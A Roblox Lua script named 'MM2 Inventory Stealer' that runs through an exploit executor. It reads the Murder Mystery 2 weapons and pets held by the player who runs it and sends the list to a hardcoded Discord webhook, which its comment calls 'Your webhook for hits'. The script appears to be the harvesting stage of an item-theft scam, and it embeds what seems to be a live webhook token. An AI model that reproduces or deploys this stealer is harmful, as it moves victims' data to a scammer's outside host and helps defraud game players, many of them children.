Config = {
    Webhook = "https://discord.com/api/webhooks/1301939328015925248/Es_vu2PBwmA15EhZoIii4aa-gQDXIr2u8R3fZPDXciUyxONbooCOpedyGDApMekdYS5b", -- Your webhook for hits.
    FullInventory = true, -- If true, it will display all of the player's items.
}

repeat wait() until game:IsLoaded()

local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local Inventory = {}
local StealerName = "MM2 Inventory Stealer" -- Updated for context

-- Notification Function
local function sendnotification(message)
    print("["..StealerName.."]:" .. message)
end

local success, errorMsg = pcall(function()
    -- Validate the webhook URL
    if not Config.Webhook:match("^https?://[%w-_%.%?%.:/%+=&]+$") then
        sendnotification("Invalid 'Webhook' url!")
        return
    end
    
    if Config.FullInventory ~= true and Config.FullInventory ~= false then
        Config.FullInventory = true
    end

    -- Inventory UI path setup
    local UIPath = LocalPlayer.PlayerGui.MainGUI.Game:FindFirstChild("Inventory") and LocalPlayer.PlayerGui.MainGUI.Game.Inventory.Main
        or LocalPlayer.PlayerGui.MainGUI.Lobby.Screens.Inventory.Main

    -- Check items in inventory
    function checkitem(v)
        if v:IsA("Frame") and v.ItemName.Label.Text ~= "Default Knife" and v.ItemName.Label.Text ~= "Default Gun" then
            local number = v.Container.Amount.Text ~= "" and v.Container.Amount.Text or "x1"
            table.insert(Inventory, v.ItemName.Label.Text .. " " .. number)
        end
    end
    
    -- Gather full inventory
    function FullInventory()
        for _,v in pairs(UIPath.Weapons.Items.Container:GetChildren()) do
            for _,sub_v in pairs(v.Container:GetChildren()) do
                checkitem(sub_v)
            end
        end
        for _,v in pairs(UIPath.Pets.Items.Container.Current.Container:GetChildren()) do
            checkitem(v)
        end
        if #Inventory == 0 then
            table.insert(Inventory, "None")
        end
        return table.concat(Inventory, ", ")
    end
    
    FullInventory()
    
    task.wait()

    -- Prepare data for webhook
    local data = {
        content = "ðŸŽ’ **__Inventory__**\n```" .. FullInventory() .. "```"
    }
    
    -- Send data to webhook
    local request = http_request or request or HttpPost or syn.request
    request({
        Url = Config.Webhook,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game.HttpService:JSONEncode(data)
    })
end)

if not success then
    sendnotification("Error: " .. errorMsg)
end
